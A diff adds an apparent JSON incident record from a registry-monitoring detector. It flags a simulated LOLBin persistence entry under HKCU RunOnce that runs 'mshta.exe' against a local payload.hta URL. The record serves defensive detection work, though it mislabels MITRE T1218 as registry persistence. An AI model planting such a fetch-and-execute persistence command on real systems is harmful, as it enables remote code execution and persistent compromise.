@@ -1,0 +1,32 @@
+{
+  "incident_id": "INC-20260902-982ED4",
+  "created_at": "2026-09-02T14:28:24.661590",
+  "title": "[HIGH] Living-off-the-Land Binary (LOLBin) Invocation on HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+  "severity": "HIGH",
+  "risk_score": 75,
+  "rule_id": "REG-EXEC-LOLBIN",
+  "rule_name": "Living-off-the-Land Binary (LOLBin) Invocation",
+  "mitre_attack": {
+    "technique_id": "T1218",
+    "technique_name": "Registry Persistence"
+  },
+  "registry_target": {
+    "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+    "value_name": "LOLBinSimTest",
+    "action": "ADDED",
+    "new_value": "mshta.exe http://127.0.0.1:8000/payload.hta",
+    "old_value": null
+  },
+  "attribution": {
+    "user": "LAPTOP-8IAQT2P0\\Asus",
+    "process_name": "powershell.exe",
+    "pid": 5228,
+    "parent_process_name": "cmd.exe",
+    "parent_pid": 5324,
+    "command_line": "powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \"Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name, CommandLine, ExecutablePath, CreationDate | ConvertTo-Json -Compress\"",
+    "integrity_level": "Medium",
+    "attribution_source": "Live Process Tree Snapshot"
+  },
+  "pe_forensics": {},
+  "remediation_status": "READY_FOR_ANALYSIS"
+}
